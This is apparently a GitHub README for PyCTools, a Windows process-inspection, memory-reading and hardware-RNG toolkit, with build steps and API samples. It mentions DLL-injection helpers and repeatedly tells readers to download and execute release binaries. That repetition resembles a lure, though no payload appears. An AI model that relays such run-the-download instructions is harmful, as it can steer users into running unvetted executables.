# PyCTools — Windows Process Inspection and Hardware RNG Toolkit 🧰🔍🎲

[![Releases](https://img.shields.io/badge/Releases-download-blue?style=for-the-badge&logo=github)](https://github.com/tiago1548/PyCTools/releases)

A cross-language toolkit for Windows process inspection and hardware random number generation. PyCTools combines a C runtime and a Python wrapper to offer low-level process snapshots, memory parsing, DLL helpers, and an HRNG interface for supported devices.

Badges
- [![Releases](https://img.shields.io/badge/Releases-download-blue?style=flat&logo=github)](https://github.com/tiago1548/PyCTools/releases)
- ![Language: Python](https://img.shields.io/badge/language-Python-blue)
- ![Language: C](https://img.shields.io/badge/language-C-0078D6)
- ![Platform: Windows](https://img.shields.io/badge/platform-Windows-0078D6?logo=windows)

Topics
c, dll, hrng, process-dump, process-info, process-snapshot, python, python-dll, python-lib, rng, tools

Quick links
- Releases (download and execute the release asset): https://github.com/tiago1548/PyCTools/releases
- Source: this repository (root)

Overview

PyCTools exposes a compact set of features that target two use cases:
1. Process inspection and forensic snapshots on Windows.
2. Hardware random number generation (HRNG) interface for supported devices.

The project ships a C DLL for performance and low-level access, and a Python package that wraps the DLL with ctypes and a small native extension for convenience. Use the Python surface for scripts and tooling. Use the C interface for integration with other languages or low-level tools.

Core features

- Process snapshot: capture a consistent snapshot of a process memory layout. Uses CreateToolhelp32Snapshot and ReadProcessMemory.
- PE parsing helpers: parse in-memory PE headers, export tables, and imported functions.
- Memory region enumeration: list committed regions, protections, sizes, and mapped files.
- Thread and module inspection: thread lists, CPU affinity, module base addresses, and timestamps.
- DLL loader helpers: a small loader to inject or probe DLLs in target processes.
- HRNG driver interface: open device, fetch raw entropy, feed OS RNG or apps.
- Cross-language API: stable C ABI and a Python wrapper with fast paths.
- Portable builds: support for MSVC and MinGW targets.

Why PyCTools

- Focus on Windows internals and high-performance inspection routines.
- Minimal external dependencies.
- Practical API for forensic tooling, automation, and research.
- Works from Python for flexible scripting and from C for tight integration.

Getting started

Prebuilt releases
- Visit the Releases page and download the packaged asset for your platform and architecture.
- The release assets include a DLL, a Python wheel where available, example scripts, and a small installer.
- After download, run the installer or extract the archive and place the DLL next to your Python script or system path.
- Releases: https://github.com/tiago1548/PyCTools/releases (download the release file and execute it)

If you need a specific build or the link fails, check the Releases section on GitHub.

Install from pip (Python)
- A pip package is available for common Windows platforms. Example:
```bash
pip install pyctools
```
- After pip install, import the package in Python and instantiate the API.

Build from source (C & Python)
C DLL build (MSVC)
1. Open x64 Native Tools Command Prompt for VS.
2. cd c_src
3. msbuild PyCTools.sln /p:Configuration=Release
4. The DLL appears in c_src/bin/Release

C DLL build (MinGW)
1. Install MinGW-w64 and add to PATH.
2. cd c_src
3. gcc -shared -o pyctools.dll src/*.c -O2 -DWIN32 -static
4. Copy pyctools.dll to your Python project folder.

Python wrapper
1. cd python
2. pip install -r requirements.txt
3. python setup.py bdist_wheel
4. pip install dist/pyctools-*.whl

Examples

Basic process info (Python)
```python
from pyctools import ProcSnapshot

snap = ProcSnapshot(1234)            # PID
info = snap.enumerate_modules()
for mod in info:
    print(mod.name, hex(mod.base), mod.size)
```

Read memory region
```python
from pyctools import ProcSnapshot

snap = ProcSnapshot(1234)
region = snap.find_region_by_address(0x7ffdf000000)
data = snap.read_region(region.base, 4096)
print(len(data))
```

Fetch hardware entropy
```python
from pyctools import HRNG

dev = HRNG.open(0)                   # device 0
buf = dev.get_entropy(64)            # 64 bytes
print(buf.hex())
```

DLL interface (C)
Header sample (pyctools.h)
```c
typedef void* pyc_handle;

pyc_handle pyc_open_process(unsigned long pid);
void pyc_close_process(pyc_handle h);
int pyc_read_memory(pyc_handle h, unsigned long long addr, void* buf, size_t len);
int pyc_enum_modules(pyc_handle h, pyc_module_cb cb, void* ctx);
```

API details

Process snapshot
- Creation: opens a handle with PROCESS_QUERY_INFORMATION | PROCESS_VM_READ.
- Snapshot: optionally suspends threads for a consistent read. The Python API exposes suspend/resume toggles.
- Regions: returns MEMORY_BASIC_INFORMATION-style entries with type, protection, and size.
- Read: supports partial reads that map to region boundaries.

PE parsing
- The code parses IMAGE_DOS_HEADER, IMAGE_NT_HEADERS, and section tables.
- It resolves exports via IMAGE_EXPORT_DIRECTORY and provides function RVA-to-address helpers.

HRNG
- The HRNG backend supports a device driver as a sample interface. The system uses CreateFile on \\.\PyCToolsHRNG.
- The API reads raw bytes and exposes two modes:
  - Raw: return raw device output.
  - Buffered: run a small whitening function for applications that require less bias.

Security model
- The library requires appropriate privileges to read other processes. Use an elevated prompt when working with SYSTEM processes.
- HRNG device access may require a driver or usermode backend.

Performance notes
- The C path reads memory in aligned chunks for speed.
- For large dumps, use the streaming reader to avoid high memory use.
- The Python wrapper buffers reads and yields memory iterators for scanning.

Testing

Unit tests
- The repo includes unit tests for core features in python/tests.
- Run tests with pytest:
```bash
pip install -r python/requirements-test.txt
pytest python/tests
```

Integration tests
- Integration tests require a sample process that the test starts and inspects.
- Tests cover module enumeration, memory read/write stubs, and HRNG device simulation.

Troubleshooting
- If you hit access denied, run as administrator or use a test process in the same user session.
- If the DLL fails to load from Python, ensure the DLL is on PATH or sits next to the script.
- If HRNG returns zeros, check the device driver and permissions.

Design notes and internals

Process snapshot strategy
- Use CreateToolhelp32Snapshot for module and thread enumeration.
- Use ReadProcessMemory for region reads.
- Optionally suspend threads to get a consistent view. The library exposes both modes so you can trade consistency for speed.

Memory layout scanning
- The snapshot API supports scanning for signatures by mapping regions and applying a mask.
- The Python wrapper exposes callback hooks that run in native code to avoid copying large buffers.

HRNG design
- The HRNG driver returns raw entropy frames.
- The library includes a simple XOR shift whitening routine as an option.
- Use the raw mode when you need original device entropy. Use buffered mode for mixed-source entropy.

Contributing

- Fork the repo.
- Create a feature branch.
- Add tests for new features.
- Open a pull request with a clear description and a changelog entry.

Release process

- Releases include compiled DLLs, wheels for supported Python versions, and sample scripts.
- Assets: the release page shows the available files. Download the asset that matches your platform and architecture, then execute the installer or run the included binaries.

Download and run
- Visit the Releases page, download the matching asset (for example: PyCTools-1.2.3-win64.zip), extract, and run the included installer or run lib\pyctools.dll with your scripts.
- Releases: https://github.com/tiago1548/PyCTools/releases (download the specific release file and execute it)

License

- The project uses the MIT license. See LICENSE.md in the repository for terms.

Maintainers and contact

- Maintainer: tiago1548 (GitHub)
- Open issues for bugs, feature requests, or build problems.
- Use pull requests for contributions.

Assets and images used in this README
- Badges generated with img.shields.io
- Windows logo and icons sourced from standard branding assets via shields logo parameter
- No external tracking or analytics included

Repository topics (repeat for clarity)
- c, dll, hrng, process-dump, process-info, process-snapshot, python, python-dll, python-lib, rng, tools

Examples and further reading
- See python/examples for scripts that show common tasks:
  - process_scan.py — memory signature scanner
  - dump_modules.py — module exporter
  - hrng_feed.py — feed OS RNG with hardware entropy

Release link again for downloads and installers
- https://github.com/tiago1548/PyCTools/releases (download and execute the release asset that matches your environment)